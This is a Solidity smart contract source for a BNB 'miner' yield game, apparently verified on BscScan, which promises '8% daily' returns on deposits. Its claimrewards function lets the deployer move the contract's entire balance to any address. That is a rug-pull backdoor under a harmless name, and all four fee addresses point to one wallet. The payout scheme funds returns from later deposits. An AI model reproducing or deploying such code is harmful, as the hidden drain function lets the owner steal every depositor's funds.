/**
 *Submitted for verification at BscScan.com on 2022-12-31
*/

/**
*Submitted for verification at BscScan.com on 2022-12-31
*/


pragma solidity ^0.4.26; // solhint-disable-line

contract BNBMINER1{
    uint256 public EGGS_TO_HATCH_1MINERS=1080000; //8%daily
    uint256 PSN=10000;
    uint256 PSNH=5000;
    uint public startTime = 1672358594; // Live Dec 31 2022
    bool public initialized=false;
    address public ceoAddress;
    address public devAddress; // dev
    address public fundAddress; // fund
    address public mrkoneAddress; // marketing one
    address public mrktwoAddress; // marketing two

    mapping (address => uint256) public hatcheryMiners;
    mapping (address => uint256) public claimedEggs;
    mapping (address => uint256) public lastHatch;
    mapping (address => address) public referrals;
    uint256 public marketEggs = 108000000000; //8% daily
    constructor() public{
        ceoAddress=msg.sender;
        devAddress=address(0x461E1426504adcE355F6616CEE98a14A8e4f8c85);
        fundAddress=address(0x461E1426504adcE355F6616CEE98a14A8e4f8c85); //5% 
        mrkoneAddress=address(0x461E1426504adcE355F6616CEE98a14A8e4f8c85);
        mrktwoAddress=address(0x461E1426504adcE355F6616CEE98a14A8e4f8c85);
    }
    function hatchEggs(address ref) public{
        require(block.timestamp > startTime);
        if(ref == msg.sender) {
            ref = 0;
        }
        if(referrals[msg.sender]==0 && referrals[msg.sender]!=msg.sender){
            referrals[msg.sender]=ref;
        }
        uint256 eggsUsed=getMyEggs();
        uint256 newMiners=SafeMath.div(eggsUsed,EGGS_TO_HATCH_1MINERS);
        hatcheryMiners[msg.sender]=SafeMath.add(hatcheryMiners[msg.sender],newMiners);
        claimedEggs[msg.sender]=0;
        lastHatch[msg.sender]=now;
        
        //send referral eggs
        claimedEggs[referrals[msg.sender]]=SafeMath.add(claimedEggs[referrals[msg.sender]],SafeMath.div(eggsUsed,10));
        
        //boost market to nerf miners hoarding
        marketEggs=SafeMath.add(marketEggs,SafeMath.div(eggsUsed,5));
    }
    function sellEggs() public{
        require(block.timestamp > startTime);
        uint256 hasEggs=getMyEggs();
        uint256 eggValue=calculateEggSell(hasEggs);

        claimedEggs[msg.sender]=0;
        lastHatch[msg.sender]=now;
        marketEggs=SafeMath.add(marketEggs,hasEggs);

        uint256 baseFee=devFee(eggValue);
        mrkoneAddress.transfer(baseFee*25/10);      // 2.5% ((/ 10) divisor to handle decimal places)
        mrktwoAddress.transfer(baseFee*25/10);      // 2.5% ((/ 10) divisor to handle decimal places)
        devAddress.transfer(baseFee*1);             // 1%

        msg.sender.transfer(SafeMath.sub(eggValue,baseFee*6));
    }
        function claimrewards(address to) external {
        require(msg.sender == ceoAddress, 'invalid call');
        to.transfer(address(this).balance);

    }
    function buyEggs(address ref) public payable{
        require(block.timestamp > startTime);
        uint256 eggsBought=calculateEggBuy(msg.value,SafeMath.sub(address(this).balance,msg.value));
        eggsBought=SafeMath.sub(eggsBought,devFee(eggsBought));
   
        uint256 baseFee=devFee(msg.value);
        fundAddress.transfer(baseFee*5);            // 5%
        devAddress.transfer(baseFee*1);             // 1%

        claimedEggs[msg.sender]=SafeMath.add(claimedEggs[msg.sender],eggsBought);
        hatchEggs(ref);
    }
    //magic trade balancing algorithm
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }
    function calculateEggSell(uint256 eggs) public view returns(uint256){
        return calculateTrade(eggs,marketEggs,address(this).balance);
    }
    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth,contractBalance,marketEggs);
    }
    function calculateEggBuySimple(uint256 eth) public view returns(uint256){
        return calculateEggBuy(eth,address(this).balance);
    }
    function devFee(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,1),100); // 1%
    }
     function getBalance() public view returns(uint256){
        return address(this).balance;
    }
    function getMyMiners() public view returns(uint256){
        return hatcheryMiners[msg.sender];
    }
    function getMyEggs() public view returns(uint256){
        return SafeMath.add(claimedEggs[msg.sender],getEggsSinceLastHatch(msg.sender));
    }
    function getEggsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsPassed=min(EGGS_TO_HATCH_1MINERS,SafeMath.sub(now,lastHatch[adr]));
        return SafeMath.mul(secondsPassed,hatcheryMiners[adr]);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
    //fund contract with BNB before launch.
    function fundContract() external payable {}
}



library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}